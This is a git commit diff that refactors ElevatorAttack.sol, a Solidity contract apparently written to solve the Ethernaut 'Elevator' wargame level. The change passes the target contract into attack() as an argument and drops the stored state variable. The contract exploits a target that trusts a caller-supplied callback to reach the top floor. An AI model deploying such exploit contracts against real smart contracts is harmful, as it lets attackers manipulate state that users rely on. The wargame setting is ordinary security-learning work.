680acfb8c3b1c0400b8b659bb88be5b173927dab
emretepedev <emretepedev@gmail.com>
2022-07-24 01:05:00 +0300

    refactor(contracts): remove unnecessary state variable

--- contracts/attacks/Elevator/ElevatorAttack.sol
+++ contracts/attacks/Elevator/ElevatorAttack.sol
@@ -5,14 +5,9 @@ pragma solidity ^0.8.0;
 import "./interfaces/IElevator.sol";
 
 contract ElevatorAttack {
-    IElevator private immutable target;
     bool private _isLastFloor = true;
 
-    constructor(IElevator target_) {
-        target = target_;
-    }
-
-    function attack() external {
+    function attack(IElevator target) external {
         target.goTo(0);
 
         require(target.top() && 0 == target.floor(), "Elevator: Attack failed");
